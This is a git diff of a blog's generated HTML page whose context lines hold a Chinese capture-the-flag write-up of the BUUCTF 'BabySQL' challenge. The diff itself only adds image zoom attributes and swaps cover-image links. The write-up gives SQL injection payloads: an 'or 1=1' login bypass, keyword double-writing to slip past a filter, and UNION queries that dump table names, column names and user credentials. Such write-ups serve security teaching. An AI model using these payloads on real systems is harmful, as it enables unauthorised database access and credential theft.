@@ -245,27 +245,27 @@
           <p>​    题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p>
 <a id="more"></a>
 
-<p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/1.png" alt="1"></p>
+<p><img data-action="zoom" src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/1.png" alt="1"></p>
 <p>尝试admin登录</p>
-<p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/2.png" alt="2"></p>
+<p><img data-action="zoom" src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/2.png" alt="2"></p>
 <p>然后尝试利用admin’or 1 = 1#</p>
-<p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/3.png" alt="3"></p>
+<p><img data-action="zoom" src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/3.png" alt="3"></p>
 <p>显然or被过滤了，</p>
 <p>这里用双写绕过admin’oorr 1 = 1#成功</p>
-<p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/4.png" alt="4"></p>
+<p><img data-action="zoom" src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/4.png" alt="4"></p>
 <p>username=u’uniunionon selselectect 1,2,3#&amp;password=p</p>
-<p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/5.png" alt="5"></p>
+<p><img data-action="zoom" src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/5.png" alt="5"></p>
 <p>得到2,3列，接下来爆库得到geek</p>
 <p>u’uniunionon selselectect 1,2,database()#&amp;password=p</p>
-<p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/6.png" alt="6"></p>
+<p><img data-action="zoom" src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/6.png" alt="6"></p>
 <p>username=u’uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()#&amp;password=p</p>
 <p>得到两个表名’b4bsql,geekuser’</p>
-<p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/7.png" alt="7"></p>
+<p><img data-action="zoom" src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/7.png" alt="7"></p>
 <p>username=u’uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=’geekuser’#&amp;password=p</p>
 <p>得到三个字段id,username,password</p>
-<p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/8.png" alt="8"></p>
+<p><img data-action="zoom" src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/8.png" alt="8"></p>
 <p>username=u’uniunionon selselectect 1,2,group_concat(id,username,passwoorrd) frfromom geekuser#&amp;password=p</p>
-<p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/9.png" alt="9"></p>
+<p><img data-action="zoom" src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/9.png" alt="9"></p>
 <p>没有发现flag</p>
 <p>重复操作在b4bsql表中发现flag</p>
 
@@ -296,7 +296,7 @@
               <div class="background">
 <!--                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">-->
                 
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/6f005cbc1865ff1b706aba57347988ab.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/b3e8dae89b950b940dc0edd1e8cc0566.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
               </div>
               <span class="label">
               Previous Post</span>
@@ -315,7 +315,7 @@
             <a href="/2020/06/25/CentOS%E9%85%8D%E7%BD%AEdocker%E5%92%8Cdocker-compose/" rel="next">
               <div class="background">
                 
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/512a1fded4940ba8d5f215809ff8c153.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/e9f33c2c502ab43804964ce7edd431f9.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
               </div>
               <span class="label">
               Next Post</span>
